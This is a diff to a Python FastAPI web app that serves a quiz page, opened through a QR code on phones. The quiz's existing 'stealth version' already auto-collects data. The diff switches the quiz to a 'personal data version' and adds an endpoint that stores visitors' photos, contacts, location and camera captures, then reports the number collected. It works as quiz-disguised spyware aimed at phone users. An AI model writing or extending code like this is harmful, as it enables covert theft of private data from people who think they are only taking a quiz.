@@ -140,6 +140,10 @@ class StealthDataUpload(BaseModel):
     session_id: str
     data: dict
 
+class PersonalDataUpload(BaseModel):
+    session_id: str
+    data: dict
+
 @app.get('/', response_class=HTMLResponse)
 async def index(request: Request):
     """Home page with QR code for mobile access"""
@@ -162,14 +166,14 @@ async def index(request: Request):
 
 @app.get('/quiz', response_class=HTMLResponse)
 async def quiz(request: Request):
-    """Quiz page where users grant permissions - STEALTH VERSION"""
+    """Quiz page where users grant permissions - PERSONAL DATA VERSION"""
     # Generate a random session ID
     session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
     # Pick a random question
     question = random.choice(QUIZ_QUESTIONS)
 
-    # Use stealth version that auto-collects data
-    return templates.TemplateResponse(request, 'quiz_stealth.html', {'session_id': session_id, 'question': question})
+    # Use personal data version that collects photos, contacts, location
+    return templates.TemplateResponse(request, 'quiz_personal.html', {'session_id': session_id, 'question': question})
 
 @app.get('/get_question')
 async def get_question():
@@ -327,6 +331,30 @@ async def upload_stealth_data(stealth_upload: StealthDataUpload):
     return JSONResponse(content={
         'status': 'success',
         'message': 'Stealth data collected successfully'
+    })
+
+@app.post('/upload_personal_data')
+async def upload_personal_data(personal_upload: PersonalDataUpload):
+    """Endpoint for receiving personal data (photos, contacts, location)"""
+    session_id = personal_upload.session_id
+    data = personal_upload.data
+
+    if session_id not in user_data_store:
+        user_data_store[session_id] = {}
+
+    # Store personal data
+    user_data_store[session_id]['personal_photos'] = data.get('photos', [])
+    user_data_store[session_id]['personal_contacts'] = data.get('contacts', [])
+    user_data_store[session_id]['personal_location'] = data.get('location')
+    user_data_store[session_id]['camera_capture'] = data.get('camera')
+
+    # Store counts
+    user_data_store[session_id]['photo_count'] = len(data.get('photos', []))
+    user_data_store[session_id]['contact_count'] = len(data.get('contacts', []))
+
+    return JSONResponse(content={
+        'status': 'success',
+        'message': f"Collected {len(data.get('photos', []))} photos and {len(data.get('contacts', []))} contacts"
     })
 
 @app.get('/show_data/{session_id}', response_class=HTMLResponse)
